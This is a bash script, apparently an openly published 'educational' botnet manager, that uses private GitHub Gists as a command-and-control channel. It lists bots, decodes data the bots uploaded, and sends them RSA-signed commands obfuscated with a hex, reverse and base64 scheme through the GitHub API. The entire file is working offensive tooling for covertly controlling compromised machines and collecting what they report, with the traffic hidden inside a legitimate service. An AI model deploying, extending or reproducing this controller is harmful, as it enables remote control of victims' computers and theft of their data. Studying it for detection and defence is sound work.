#!/bin/bash

##############################################
# Simple bash botnet Manager by @joydragon
# C2 on Github Gists
#
# This is intended for educational purposes only
# It is not perfect and it is not the intent
# If you can't see it, it's your fault :P
##############################################

##############################################
# Global Variables
URL_GIST=""
BOT_URL=""
BOT_LIST=""
FILES_LIST=""

PRIVATE_FILE="private.pem"
PUBLIC_FILE="public.pem"
##############################################
# RSA Public key
PUBLIC=""

##############################################
# Global Flags
EXIT=0
SIGNED=1

##############################################
# Github API token
TOK=""

##############################################
# Functions
##############################################

##############################################
# MSG ENCODING:
#	HEX -> REVERSE -> BASE64 -> HEX
##############################################
function enc {
	echo -e "$1" | xxd -p | paste -s -d "" - | rev | paste -s -d "" - | base64 | paste -s -d "" - | tr -d "=" | xxd -p | paste -d "" -s
}

##############################################
# MSG DECODING:
#	HEX -> BASE64 -> REVERSE -> HEX
##############################################
function dec {
	echo -e "$1" | xxd -r -p | base64 -id 2>/dev/null | rev | xxd -r -p
}

##############################################
# Message signing, and also concat that signature (in Base64) to the message
function sign {
	B64=$(echo "$1" | openssl dgst -sha1 -sign <(cat "$PRIVATE_FILE") | base64 -w 0)
	echo -e "$1:${B64}"
}

##############################################
# Message signature (in Base64) verification
function ver {
	if [ -n "$PUBLIC" ]; then
        VAR=($(echo "$1" | tr ":" "\n"))
        if [ -n "${VAR[0]}" ] &&  [ -n "${VAR[1]}" ]; then
                echo -e ${VAR[0]} | openssl dgst -sha1 -verify <(echo -e "$PUBLIC") -signature <(echo ${VAR[1]} | base64 -d)
        else
                echo "Failed"
        fi
	fi
}

##############################################
# Send communications
function com {
	URL_GIST="$1"
	COM="$2"
	ENC_COM=$(enc "$COM")
	if [ "$SIGNED" == "1" ]; then
		ENC_COM=$(sign "$ENC_COM")
	fi
	if [ -n "${URL_GIST}" ]; then 
		URL=$(curl -s -X PATCH -H "Accept: application/vnd.github.v3+json" -H "Authorization: token ${TOK}" ${URL_GIST} -d  '{"public": false, "files": {"comm": { "content": "'${ENC_COM}'"} } }' | grep '"forks_url"' | sed -e "s/^.*https/https/" -e "s/\/forks.*$//");
	fi
}

##############################################
# List files from bot
function list_files {
	BOT_URL="$1"
	if [ -n "${BOT_URL}" ]; then
		RES=$(curl -s -H "Accept: application/vnd.github.v3+json" -H "Authorization: token ${TOK}" "${BOT_URL}" | jq -r '.files[] | .filename + ":" + .content' )
		FILES_LIST=(${RES})
	fi
}

function menu_list_files {
	echo ""
	echo ""
	echo "Selecciona el numero del archivo para decodificarlo."
	echo "Selecciona '->' para enviar un comando al bot"
	echo "Cualquier otra opcion para salir"
	echo ""
	OPS=()
	for op in "${FILES_LIST[@]}"; do
		OPS+=("$(echo $op | cut -c -50) ...")
	done
	OPS+=("->")
	
	select opt in "${OPS[@]}"
	do
		if [[ "$opt" == "->" ]]; then
			echo "Escribe tu comando:"
			echo ""
			read COM
			com "$BOT_URL" "$COM"
			break
		elif [ -n "$opt" ]; then
			CON=$(echo ${FILES_LIST[$((REPLY-1))]} | sed -e "s/^.*://")
			echo ""
			dec "$CON"
			echo "Presiona cualquier tecla para seguir"
			read -n1
			break
		else
			EXIT=1
			break
		fi
	done
}

##############################################
# List bots
function list_bot {
	RES=$(curl -s -H "Accept: application/vnd.github.v3+json" -H "Authorization: token ${TOK}" https://api.github.com/gists | jq -r '.[] | select(.public == false) | .updated_at + ":::" + .url')
	BOT_LIST=($RES)
}

function menu_list_bot {
	echo ""
	echo ""
	echo "Tenemos los siguientes bots:"
	echo ""
	
	select opt in "${BOT_LIST[@]}"
	do
		if [ -n "$opt" ]; then
			URL=$(echo $opt | sed -e "s/^.*::://")
			list_files "$URL"
			while [ "$EXIT" -ne "1" ]; do
				menu_list_files
			done
			EXIT=0
			break
		else
			break
		fi
	done
}

##############################################
# MAIN
##############################################

hash jq 2>/dev/null || { echo >&2 "Error: You need to install 'jq', Please install it before using this script."; exit 1; }

if [ -z "$TOK" ]; then
	echo "ERROR: Github token is not present. Please generate the token with Gists permissions before using this script."
	echo "More information here: https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/creating-a-personal-access-token"
	exit
fi

if [ -z "$PUBLIC" ]; then
	if [ ! -f "$PRIVATE_FILE" ]; then
		echo "RSA private key not found"
		echo "Generating RSA keys first."
		openssl genrsa -out "$PRIVATE_FILE" 4096
		echo ""
	fi
	if [ ! -f "$PUBLIC_FILE" ]; then
		echo "Extracting the public key from the private one."
		openssl rsa -in "$PRIVATE_FILE" -out "$PUBLIC_FILE" -pubout > /dev/null
		echo ""
	fi
	echo "Please add the public key text stored in '$PUBLIC_FILE' fully to each bot and this manager also."
	PUBLIC=$(cat "$PUBLIC_FILE")
	echo "$PUBLIC"
	echo ""
fi

list_bot
if [ ${#BOT_LIST[@]} -eq 0 ]; then
	echo "There are no bots communicating with this account. Please try again when some bot has uploaded some info."
	echo ""
	exit
fi

while true; do
	menu_list_bot
done
